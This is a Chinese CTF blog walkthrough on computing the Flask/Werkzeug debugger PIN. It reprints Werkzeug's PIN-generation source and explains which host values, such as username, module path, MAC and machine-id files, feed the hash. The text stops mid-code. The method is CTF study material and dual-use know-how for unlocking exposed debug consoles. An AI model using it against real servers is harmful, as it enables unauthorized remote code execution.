<!DOCTYPE HTML>
<html lang="zh-CN">


<head>
    <meta charset="utf-8">
    <meta name="keywords" content="flask算PIN值, Aurorabin">
    <meta name="description" content="flask算PIN值python3.6和python3.8算法不一样
还是要学会看源码的生成算法
探寻PIN码生成算法 先写一个简单的Flask测试程序 
from flask import Flask
app = Flask(__name">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <meta name="renderer" content="webkit|ie-stand|ie-comp">
    <meta name="mobile-web-app-capable" content="yes">
    <meta name="format-detection" content="telephone=no">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
    <meta name="referrer" content="no-referrer-when-downgrade">
    <!-- Global site tag (gtag.js) - Google Analytics -->


    <title>flask算PIN值 | Aurorabin</title>
    <link rel="icon" type="image/png" href="/favicon.png">
    


    <!-- bg-cover style     -->



<link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.min.css">
<link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
<link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
<link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
<link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
<link rel="stylesheet" type="text/css" href="/css/matery.css">
<link rel="stylesheet" type="text/css" href="/css/my.css">
<link rel="stylesheet" type="text/css" href="/css/dark.css" media="none" onload="if(media!='all')media='all'">




    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
    <link rel="stylesheet" href="/css/post.css">




    
        <link rel="stylesheet" type="text/css" href="/css/reward.css">
    



    <script src="/libs/jquery/jquery-3.6.0.min.js"></script>

<meta name="generator" content="Hexo 6.2.0"></head>


<body>
    <header class="navbar-fixed">
    <nav id="headNav" class="bg-color nav-transparent">
        <div id="navContainer" class="nav-wrapper container">
            <div class="brand-logo">
                <a href="/" class="waves-effect waves-light">
                    
                    <img src="/medias/logo.png" class="logo-img" alt="LOGO">
                    
                    <span class="logo-span">Aurorabin</span>
                </a>
            </div>
            

<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
<ul class="right nav-menu">
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/" class="waves-effect waves-light">
      
      <i class="fas fa-home" style="zoom: 0.6;"></i>
      
      <span>首页</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/tags" class="waves-effect waves-light">
      
      <i class="fas fa-tags" style="zoom: 0.6;"></i>
      
      <span>标签</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/categories" class="waves-effect waves-light">
      
      <i class="fas fa-bookmark" style="zoom: 0.6;"></i>
      
      <span>分类</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/archives" class="waves-effect waves-light">
      
      <i class="fas fa-archive" style="zoom: 0.6;"></i>
      
      <span>归档</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/about" class="waves-effect waves-light">
      
      <i class="fas fa-user-circle" style="zoom: 0.6;"></i>
      
      <span>关于</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/contact" class="waves-effect waves-light">
      
      <i class="fas fa-comments" style="zoom: 0.6;"></i>
      
      <span>留言板</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/friends" class="waves-effect waves-light">
      
      <i class="fas fa-address-book" style="zoom: 0.6;"></i>
      
      <span>友情链接</span>
    </a>
    
  </li>
  
  <li>
    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
      <i id="searchIcon" class="fas fa-search" title="搜索" style="zoom: 0.85;"></i>
    </a>
  </li>
  <li>
    <a href="javascript:;" class="waves-effect waves-light" onclick="switchNightMode()" title="深色/浅色模式" >
      <i id="sum-moon-icon" class="fas fa-sun" style="zoom: 0.85;"></i>
    </a>
  </li>
</ul>


<div id="mobile-nav" class="side-nav sidenav">

    <div class="mobile-head bg-color">
        
        <img src="/medias/logo.png" class="logo-img circle responsive-img">
        
        <div class="logo-name">Aurorabin</div>
        <div class="logo-desc">
            
            Aurorabin是啥都不会的菜狗
            
        </div>
    </div>

    <ul class="menu-list mobile-menu-list">
        
        <li class="m-nav-item">
	  
		<a href="/" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-home"></i>
			
			首页
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/tags" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-tags"></i>
			
			标签
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/categories" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-bookmark"></i>
			
			分类
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/archives" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-archive"></i>
			
			归档
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/about" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-user-circle"></i>
			
			关于
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/contact" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-comments"></i>
			
			留言板
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/friends" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-address-book"></i>
			
			友情链接
		</a>
          
        </li>
        
        
        <li><div class="divider"></div></li>
        <li>
            <a href="https://github.com/blinkfox/hexo-theme-matery" class="waves-effect waves-light" target="_blank">
                <i class="fab fa-github-square fa-fw"></i>Fork Me
            </a>
        </li>
        
    </ul>
</div>


        </div>

        
            <style>
    .nav-transparent .github-corner {
        display: none !important;
    }

    .github-corner {
        position: absolute;
        z-index: 10;
        top: 0;
        right: 0;
        border: 0;
        transform: scale(1.1);
    }

    .github-corner svg {
        color: #0f9d58;
        fill: #fff;
        height: 64px;
        width: 64px;
    }

    .github-corner:hover .octo-arm {
        animation: a 0.56s ease-in-out;
    }

    .github-corner .octo-arm {
        animation: none;
    }

    @keyframes a {
        0%,
        to {
            transform: rotate(0);
        }
        20%,
        60% {
            transform: rotate(-25deg);
        }
        40%,
        80% {
            transform: rotate(10deg);
        }
    }
</style>

<a href="https://github.com/blinkfox/hexo-theme-matery" class="github-corner tooltipped hide-on-med-and-down" target="_blank"
   data-tooltip="Fork Me" data-position="left" data-delay="50">
    <svg viewBox="0 0 250 250" aria-hidden="true">
        <path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path>
        <path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2"
              fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path>
        <path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z"
              fill="currentColor" class="octo-body"></path>
    </svg>
</a>
        
    </nav>

</header>

    



<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/5.jpg')">
    <div class="container" style="right: 0px;left: 0px;">
        <div class="row">
            <div class="col s12 m12 l12">
                <div class="brand">
                    <h1 class="description center-align post-title">flask算PIN值</h1>
                </div>
            </div>
        </div>
    </div>
</div>




<main class="post-container content">

    
    <div class="row">
    <div id="main-content" class="col s12 m12 l9">
        <!-- 文章内容详情 -->
<div id="artDetail">
    <div class="card">
        <div class="card-content article-info">
            <div class="row tag-cate">
                <div class="col s7">
                    
                    <div class="article-tag">
                        
                            <a href="/tags/ctfshow/">
                                <span class="chip bg-color">ctfshow</span>
                            </a>
                        
                    </div>
                    
                </div>
                <div class="col s5 right-align">
                    
                </div>
            </div>

            <div class="post-info">
                
                <div class="post-date info-break-policy">
                    <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
                    2022-09-13
                </div>
                

                

                

                

                
            </div>
        </div>
        <hr class="clearfix">

        
        <!-- 是否加载使用自带的 prismjs. -->
        <link rel="stylesheet" href="/libs/prism/prism.min.css">
        

        
        <!-- 代码块折行 -->
        <style type="text/css">
            code[class*="language-"], pre[class*="language-"] { white-space: pre-wrap !important; }
        </style>
        

        <div class="card-content article-card-content">
            <div id="articleContent">
                <h2 id="flask算PIN值"><a href="#flask算PIN值" class="headerlink" title="flask算PIN值"></a>flask算PIN值</h2><p><strong>python3.6和python3.8算法不一样</strong></p>
<p>还是要学会看源码的生成算法</p>
<h2 id="探寻PIN码生成算法"><a href="#探寻PIN码生成算法" class="headerlink" title="探寻PIN码生成算法"></a>探寻PIN码生成算法</h2><p> 先写一个简单的Flask测试程序 </p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask
app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>
<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">hello</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> <span class="token string">'合天网安实验室-实践型网络安全在线学习平台；真实环境，在线实操学网络安全。'</span>

<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>
    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">"0.0.0.0"</span><span class="token punctuation">,</span> port<span class="token operator">=</span><span class="token number">8080</span><span class="token punctuation">,</span> debug<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>运行，控制台状态如下</p>
<p><img src="/images/2dbf5235a729095e8b094a14c38f9760.png" alt="img"></p>
<p>浏览器如下则成功</p>
<p><img src="/images/03346ded07b0283c4a0052a88dbd8e5f.png" alt="img"></p>
<p>接下来开始调试程序，顺藤摸瓜找到生成PIN码的函数</p>
<p> PIN码是werkzeug的策略，先找到flask中导入werkzeug的部分 </p>
<p>调试<br>在run.app行下断点，点击调试<img src="/images/e4dd2f36eb62e5fa59e586714ca8fa3f.png" alt="img"> </p>
<p>点击步入<img src="/images/c0c8ca73c10f9b79f386b5d9909735f8.png" alt="img"> </p>
<p>转到了flask&#x2F;app.py，直接Ctrl+F搜索werkzeug</p>
<p> <img src="/images/8584cacb40e8020607a9f09928d0f7b2-1663416119562.png" alt="img"> </p>
<p>发现程序从werkzeug导入了run_simple模块，而且try部分有run app的参数</p>
<p>我们直接按住ctrl点击run_simple进去看看</p>
<p>此时进入了seving.py，找到了负责Debug的部分，PIN码是在debug状态下才有的，那这个部分很有可能存有PIN码生成部分，进去看看<img src="/images/698e5376941a2cf955b3eaf00936fcd0.png" alt="img"> </p>
<p>此时进入了<code>__init__.py</code>，经过一番审计，先来看一看pin函数</p>
<p> <img src="/images/52a4eed3bda5e8ac77f2525ec4dbdef5.png" alt="img"> </p>
<p>主要是get_pin_and_cookie_name函数，进去看看</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">get_pin_and_cookie_name</span><span class="token punctuation">(</span>
    app<span class="token punctuation">:</span> <span class="token string">"WSGIApplication"</span><span class="token punctuation">,</span>
<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> t<span class="token punctuation">.</span>Union<span class="token punctuation">[</span>t<span class="token punctuation">.</span>Tuple<span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">]</span><span class="token punctuation">,</span> t<span class="token punctuation">.</span>Tuple<span class="token punctuation">[</span><span class="token boolean">None</span><span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">:</span>
    <span class="token triple-quoted-string string">"""Given an application object this returns a semi-stable 9 digit pin
    code and a random key.  The hope is that this is stable between
    restarts to not make debugging particularly frustrating.  If the pin
    was forcefully disabled this returns `None`.
    Second item in the resulting tuple is the cookie name for remembering.
    """</span>
    pin <span class="token operator">=</span> os<span class="token punctuation">.</span>environ<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"WERKZEUG_DEBUG_PIN"</span><span class="token punctuation">)</span>
    rv <span class="token operator">=</span> <span class="token boolean">None</span>
    num <span class="token operator">=</span> <span class="token boolean">None</span>
    <span class="token comment"># Pin was explicitly disabled</span>
    <span class="token keyword">if</span> pin <span class="token operator">==</span> <span class="token string">"off"</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token boolean">None</span><span class="token punctuation">,</span> <span class="token boolean">None</span>
    <span class="token comment"># Pin was provided explicitly</span>
    <span class="token keyword">if</span> pin <span class="token keyword">is</span> <span class="token keyword">not</span> <span class="token boolean">None</span> <span class="token keyword">and</span> pin<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"-"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">.</span>isdigit<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token comment"># If there are separators in the pin, return it directly</span>
        <span class="token keyword">if</span> <span class="token string">"-"</span> <span class="token keyword">in</span> pin<span class="token punctuation">:</span>
            rv <span class="token operator">=</span> pin
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            num <span class="token operator">=</span> pin
    modname <span class="token operator">=</span> <span class="token builtin">getattr</span><span class="token punctuation">(</span>app<span class="token punctuation">,</span> <span class="token string">"__module__"</span><span class="token punctuation">,</span> t<span class="token punctuation">.</span>cast<span class="token punctuation">(</span><span class="token builtin">object</span><span class="token punctuation">,</span> app<span class="token punctuation">)</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__module__<span class="token punctuation">)</span>
    username<span class="token punctuation">:</span> t<span class="token punctuation">.</span>Optional<span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">]</span>
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        <span class="token comment"># getuser imports the pwd module, which does not exist in Google</span>
        <span class="token comment"># App Engine. It may also raise a KeyError if the UID does not</span>
        <span class="token comment"># have a username, such as in Docker.</span>
        username <span class="token operator">=</span> getpass<span class="token punctuation">.</span>getuser<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">except</span> <span class="token punctuation">(</span>ImportError<span class="token punctuation">,</span> KeyError<span class="token punctuation">)</span><span class="token punctuation">:</span>
        username <span class="token operator">=</span> <span class="token boolean">None</span>
    mod <span class="token operator">=</span> sys<span class="token punctuation">.</span>modules<span class="token punctuation">.</span>get<span class="token punctuation">(</span>modname<span class="token punctuation">)</span>
    <span class="token comment"># This information only exists to make the cookie unique on the</span>
    <span class="token comment"># computer, not as a security feature.</span>
    probably_public_bits <span class="token operator">=</span> <span class="token punctuation">[</span>
        username<span class="token punctuation">,</span>
        modname<span class="token punctuation">,</span>
        <span class="token builtin">getattr</span><span class="token punctuation">(</span>app<span class="token punctuation">,</span> <span class="token string">"__name__"</span><span class="token punctuation">,</span> <span class="token builtin">type</span><span class="token punctuation">(</span>app<span class="token punctuation">)</span><span class="token punctuation">.</span>__name__<span class="token punctuation">)</span><span class="token punctuation">,</span>
        <span class="token builtin">getattr</span><span class="token punctuation">(</span>mod<span class="token punctuation">,</span> <span class="token string">"__file__"</span><span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token punctuation">]</span>
    <span class="token comment"># This information is here to make it harder for an attacker to</span>
    <span class="token comment"># guess the cookie name.  They are unlikely to be contained anywhere</span>
    <span class="token comment"># within the unauthenticated debug page.</span>
    private_bits <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">(</span>uuid<span class="token punctuation">.</span>getnode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> get_machine_id<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span>
    h <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>sha1<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">for</span> bit <span class="token keyword">in</span> chain<span class="token punctuation">(</span>probably_public_bits<span class="token punctuation">,</span> private_bits<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">if</span> <span class="token keyword">not</span> bit<span class="token punctuation">:</span>
            <span class="token keyword">continue</span>
        <span class="token keyword">if</span> <span class="token builtin">isinstance</span><span class="token punctuation">(</span>bit<span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            bit <span class="token operator">=</span> bit<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span>
        h<span class="token punctuation">.</span>update<span class="token punctuation">(</span>bit<span class="token punctuation">)</span>
    h<span class="token punctuation">.</span>update<span class="token punctuation">(</span><span class="token string">b"cookiesalt"</span><span class="token punctuation">)</span>
    cookie_name <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"__wzd</span><span class="token interpolation"><span class="token punctuation">&#123;</span>h<span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token format-spec">20]</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span>
    <span class="token comment"># If we need to generate a pin we salt it a bit more so that we don't</span>
    <span class="token comment"># end up with the same value and generate out 9 digits</span>
    <span class="token keyword">if</span> num <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>
        h<span class="token punctuation">.</span>update<span class="token punctuation">(</span><span class="token string">b"pinsalt"</span><span class="token punctuation">)</span>
        num <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">int</span><span class="token punctuation">(</span>h<span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token format-spec">09d</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">9</span><span class="token punctuation">]</span>
    <span class="token comment"># Format the pincode in groups of digits for easier remembering if</span>
    <span class="token comment"># we don't have a result yet.</span>
    <span class="token keyword">if</span> rv <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>
        <span class="token keyword">for</span> group_size <span class="token keyword">in</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">:</span>
            <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span> <span class="token operator">%</span> group_size <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>
                rv <span class="token operator">=</span> <span class="token string">"-"</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>
                    num<span class="token punctuation">[</span>x <span class="token punctuation">:</span> x <span class="token operator">+</span> group_size<span class="token punctuation">]</span><span class="token punctuation">.</span>rjust<span class="token punctuation">(</span>group_size<span class="token punctuation">,</span> <span class="token string">"0"</span><span class="token punctuation">)</span>
                    <span class="token keyword">for</span> x <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">,</span> group_size<span class="token punctuation">)</span>
                <span class="token punctuation">)</span>
                <span class="token keyword">break</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            rv <span class="token operator">=</span> num
    <span class="token keyword">return</span> rv<span class="token punctuation">,</span> cookie_name<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p> 返回的rv就是PIN码，但这个函数核心是将列表里的值hash，我们不需要去读懂这段代码，只需要将列表里的值填上直接运行代码就行。 </p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> getpass
<span class="token keyword">import</span> hashlib
<span class="token keyword">import</span> json
<span class="token keyword">import</span> os
<span class="token keyword">import</span> pkgutil
<span class="token keyword">import</span> re
<span class="token keyword">import</span> sys
<span class="token keyword">import</span> time
<span class="token keyword">import</span> typing <span class="token keyword">as</span> t
<span class="token keyword">import</span> uuid
<span class="token keyword">from</span> contextlib <span class="token keyword">import</span> ExitStack
<span class="token keyword">from</span> contextlib <span class="token keyword">import</span> nullcontext
<span class="token keyword">from</span> io <span class="token keyword">import</span> BytesIO
<span class="token keyword">from</span> itertools <span class="token keyword">import</span> chain
<span class="token keyword">from</span> os<span class="token punctuation">.</span>path <span class="token keyword">import</span> basename
<span class="token keyword">from</span> os<span class="token punctuation">.</span>path <span class="token keyword">import</span> join
<span class="token keyword">from</span> zlib <span class="token keyword">import</span> adler32

<span class="token keyword">from</span> <span class="token punctuation">.</span><span class="token punctuation">.</span>_internal <span class="token keyword">import</span> _log
<span class="token keyword">from</span> <span class="token punctuation">.</span><span class="token punctuation">.</span>exceptions <span class="token keyword">import</span> NotFound
<span class="token keyword">from</span> <span class="token punctuation">.</span><span class="token punctuation">.</span>http <span class="token keyword">import</span> parse_cookie
<span class="token keyword">from</span> <span class="token punctuation">.</span><span class="token punctuation">.</span>security <span class="token keyword">import</span> gen_salt
<span class="token keyword">from</span> <span class="token punctuation">.</span><span class="token punctuation">.</span>utils <span class="token keyword">import</span> send_file
<span class="token keyword">from</span> <span class="token punctuation">.</span><span class="token punctuation">.</span>wrappers<span class="token punctuation">.</span>request <span class="token keyword">import</span> Request
<span class="token keyword">from</span> <span class="token punctuation">.</span><span class="token punctuation">.</span>wrappers<span class="token punctuation">.</span>response <span class="token keyword">import</span> Response
<span class="token keyword">from</span> <span class="token punctuation">.</span>console <span class="token keyword">import</span> Console
<span class="token keyword">from</span> <span class="token punctuation">.</span>tbtools <span class="token keyword">import</span> DebugFrameSummary
<span class="token keyword">from</span> <span class="token punctuation">.</span>tbtools <span class="token keyword">import</span> DebugTraceback
<span class="token keyword">from</span> <span class="token punctuation">.</span>tbtools <span class="token keyword">import</span> render_console_html

<span class="token keyword">if</span> t<span class="token punctuation">.</span>TYPE_CHECKING<span class="token punctuation">:</span>
    <span class="token keyword">from</span> _typeshed<span class="token punctuation">.</span>wsgi <span class="token keyword">import</span> StartResponse
    <span class="token keyword">from</span> _typeshed<span class="token punctuation">.</span>wsgi <span class="token keyword">import</span> WSGIApplication
    <span class="token keyword">from</span> _typeshed<span class="token punctuation">.</span>wsgi <span class="token keyword">import</span> WSGIEnvironment

<span class="token comment"># A week</span>
PIN_TIME <span class="token operator">=</span> <span class="token number">60</span> <span class="token operator">*</span> <span class="token number">60</span> <span class="token operator">*</span> <span class="token number">24</span> <span class="token operator">*</span> <span class="token number">7</span>


<span class="token keyword">def</span> <span class="token function">hash_pin</span><span class="token punctuation">(</span>pin<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">str</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> hashlib<span class="token punctuation">.</span>sha1<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>pin<span class="token punctuation">&#125;</span></span><span class="token string"> added salt"</span></span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">"utf-8"</span><span class="token punctuation">,</span> <span class="token string">"replace"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">12</span><span class="token punctuation">]</span>


_machine_id<span class="token punctuation">:</span> t<span class="token punctuation">.</span>Optional<span class="token punctuation">[</span>t<span class="token punctuation">.</span>Union<span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">,</span> <span class="token builtin">bytes</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token boolean">None</span>


<span class="token keyword">def</span> <span class="token function">get_machine_id</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> t<span class="token punctuation">.</span>Optional<span class="token punctuation">[</span>t<span class="token punctuation">.</span>Union<span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">,</span> <span class="token builtin">bytes</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">:</span>
    <span class="token keyword">global</span> _machine_id

    <span class="token keyword">if</span> _machine_id <span class="token keyword">is</span> <span class="token keyword">not</span> <span class="token boolean">None</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> _machine_id

    <span class="token keyword">def</span> <span class="token function">_generate</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> t<span class="token punctuation">.</span>Optional<span class="token punctuation">[</span>t<span class="token punctuation">.</span>Union<span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">,</span> <span class="token builtin">bytes</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">:</span>
        linux <span class="token operator">=</span> <span class="token string">b""</span>

        <span class="token comment"># machine-id is stable across boots, boot_id is not.</span>
        <span class="token keyword">for</span> filename <span class="token keyword">in</span> <span class="token string">"/etc/machine-id"</span><span class="token punctuation">,</span> <span class="token string">"/proc/sys/kernel/random/boot_id"</span><span class="token punctuation">:</span>
            <span class="token keyword">try</span><span class="token punctuation">:</span>
                <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>filename<span class="token punctuation">,</span> <span class="token string">"rb"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
                    value <span class="token operator">=</span> f<span class="token punctuation">.</span>readline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span>
            <span class="token keyword">except</span> OSError<span class="token punctuation">:</span>
                <span class="token keyword">continue</span>

            <span class="token keyword">if</span> value<span class="token punctuation">:</span>
                linux <span class="token operator">+=</span> value
                <span class="token keyword">break</span> <span class="token comment">#有个break</span>

        <span class="token comment"># Containers share the same machine id, add some cgroup</span>
        <span class="token comment"># information. This is used outside containers too but should be</span>
        <span class="token comment"># relatively stable across boots.</span>
        <span class="token keyword">try</span><span class="token punctuation">:</span>
            <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"/proc/self/cgroup"</span><span class="token punctuation">,</span> <span class="token string">"rb"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
                linux <span class="token operator">+=</span> f<span class="token punctuation">.</span>readline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>rpartition<span class="token punctuation">(</span><span class="token string">b"/"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span>
        <span class="token keyword">except</span> OSError<span class="token punctuation">:</span>
            <span class="token keyword">pass</span>

        <span class="token keyword">if</span> linux<span class="token punctuation">:</span>
            <span class="token keyword">return</span> linux

        <span class="token comment"># On OS X, use ioreg to get the computer's serial number.</span>
        <span class="token keyword">try</span><span class="token punctuation">:</span>
            <span class="token comment"># subprocess may not be available, e.g. Google App Engine</span>
            <span class="token comment"># https://github.com/pallets/werkzeug/issues/925</span>
            <span class="token keyword">from</span> subprocess <span class="token keyword">import</span> Popen<span class="token punctuation">,</span> PIPE

            dump <span class="token operator">=</span> Popen<span class="token punctuation">(</span>
